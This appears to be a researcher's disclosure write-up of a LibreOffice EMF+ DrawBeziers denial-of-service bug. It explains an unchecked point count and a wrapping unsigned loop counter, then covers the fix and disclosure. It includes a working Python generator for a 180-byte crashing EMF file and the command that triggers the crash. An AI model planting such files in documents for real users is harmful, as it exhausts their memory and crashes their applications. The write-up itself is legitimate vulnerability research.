An image file is not really data. It is a little program the renderer runs on your behalf - a list of instructions saying draw this, then this, then this. Which means the interesting question for any image parser is always the same: what happens when one of those instructions lies about how much data backs it up?

In LibreOffice's EMF+ parser, one instruction lied, and the parser believed it so completely that a 180-byte file drove it to eat 4 GB of RAM in about twenty seconds and then fall over. No macros, no exploit chain. You just open a document.

## Where a file becomes an instruction stream

LibreOffice renders Enhanced Metafile graphics - EMF and the newer EMF+ - and it renders them *automatically* when they're embedded in a document. A `.docx`, `.odt`, `.pptx` with an EMF image inside gets that image parsed and drawn the moment you open the file. So the attack surface isn't "someone opens a weird `.emf`," it's "someone opens a Word doc."

EMF+ is a stream of records. One of them, `DrawBeziers`, says: here is a count of points, followed by the points. The handler lives in `drawinglayer/source/tools/emfphelperdata.cxx`. I was reading the record handlers looking for exactly this shape - a count from the file used to drive a loop - because that pairing is where parsers go to die.

## The only guard it had

The handler reads the attacker's 32-bit count and checks one thing:

```cpp
sal_uInt32 aCount(0);
rMS.ReadUInt32(aCount);
if (aCount < 4) { /* warn */ break; }   // rejects only values below 4
```

That's the entire validation. `Count` must be at least 4. It is never checked against how many points the record *actually contains*. You can say "I have four billion points" in a record that holds one.

## The loop that can't leave

Then it reads points in a loop:

```cpp
ReadPoint(rMS, x1, y1, flags);
aPolygon.append(Map(x1, y1));
for (sal_uInt32 i = 4; i <= aCount; i += 3)   // i is a sal_uInt32
{
    ReadPoint(rMS, x2, y2, flags);   // no rMS.good() / EOF check
    ReadPoint(rMS, x3, y3, flags);
    ReadPoint(rMS, x4, y4, flags);
    aPolygon.appendBezierSegment(Map(x2,y2), Map(x3,y3), Map(x4,y4));
}
```

Look at the counter. `i` starts at 4 and jumps by 3 each time: 4, 7, 10, 13... So `i` is always `1 (mod 3)`. Now set `aCount = 0xFFFFFFFF`. That value is `0 (mod 3)`. The loop's exit test is `i <= aCount`, and `i` will never *equal* `aCount` because they're in different residue classes - but that's not even the whole trick. `i` is an unsigned 32-bit int. It climbs to `0xFFFFFFFD`, runs the body, then `i += 3` overflows and wraps to `0x00000000`. And off it goes again, 3, 6, 9... forever. The counter can never satisfy the exit condition because the exit condition is on the far side of an integer overflow.

Two smaller sins make it worse. There's no `rMS.good()` check inside the loop, so once the tiny record runs out of bytes, `ReadPoint` just keeps returning zeros and the loop keeps going, happily. And every single iteration calls `appendBezierSegment`, which grows an in-memory polygon. So the infinite loop is also an infinite allocation.

## 180 bytes, 4 GB

The whole payload is one record with a poisoned count, wrapped in the EMF+ comment envelope EMF uses to carry EMF+ data. The bytes that matter:

```
19 40 00 00   # record type 0x4019 (DrawBeziers)
10 00 00 00   # Size = 16
04 00 00 00   # DataSize = 4
FF FF FF FF   # Count = 0xFFFFFFFF   <-- the lie
```

A short Python generator emits the full 180-byte file:

```
import struct
P = struct.pack

def emf_header(nbytes, nrecords):
    return P("<II4i4iIIIIHHIII4i",1,88,0,0,1,1,0,0,100,100,0x464d4520,0x00010000,
        nbytes,nrecords,1,0,0,0,0,100,100,1,1)

def emf_comment(data):
    payload = P("<I",0x2b464d45)+data
    return P("<III",70,12+len(payload),len(payload))+payload

EMR_EOF = P("<IIIII",14,20,0,0,20)

def plus(rec_type,flags,payload=b""):
    return P("<HHII",rec_type,flags,12+len(payload),len(payload))+payload

PLUS_HEADER = plus(0x4001,0,P("<IIII",0xDBC01001,0,96,96))
PLUS_EOF = plus(0x4002,0)

def emf_plus_file(records):
    data = b"".join([PLUS_HEADER,*records,PLUS_EOF])
    comment = emf_comment(data)
    return emf_header(88+len(comment)+len(EMR_EOF),3)+comment+EMR_EOF

# DrawBeziers record with Count = 0xffffffff
bad = bytes.fromhex("19400000" "10000000" "04000000" "ffffffff")
open("drawbeziers-dos.emf","wb").write(emf_plus_file([bad]))
```

Feed it to LibreOffice however you like - the headless converter is the cleanest demo:

```
soffice --headless --convert-to pdf drawbeziers-dos.emf
```

Watch `soffice.bin` climb from nothing to ~4 GB resident in ~22 seconds, then die on a failed allocation (or take the host into swap first). If you'd rather not risk your machine, cap it and let it fail fast:

```
( ulimit -v 2000000; soffice --headless --convert-to pdf drawbeziers-dos.emf )
```

A benign EMF, for comparison, converts instantly.

## The fix, and the shape to remember

The fix is titled, aptly, "limit the bezier points to what the record holds" - which is the one sentence the original loop was missing. Concretely: bound the count by the points that can actually fit in the remaining record data (sibling EMF+ handlers already do this with `rMS.remainingSize()`), check `rMS.good()` inside the loop, and don't write a loop bound that an unsigned wraparound can step over.

The general shape is worth keeping: any time a count comes from the file, the count is a claim, not a fact. The bytes left in the record are the fact. Bound the loop by what you actually have, never by what the input says you should.

## Disclosure

Reported to the LibreOffice security team on September 20, 2026. Caolán McNamara confirmed it the same week and landed a fix, crediting me in the commit message ("Thanks to Manan Patel (0xManan)"), merged as gerrit change 211331.

No CVE was issued, and that's by policy rather than oversight: LibreOffice treats denial-of-service at the application level as a normal bug, not a security vulnerability that needs special handling. I think that's a defensible line for "the app crashes" - it's still worth fixing, it's fixed, and I'm credited for it, which is why it's written up here.
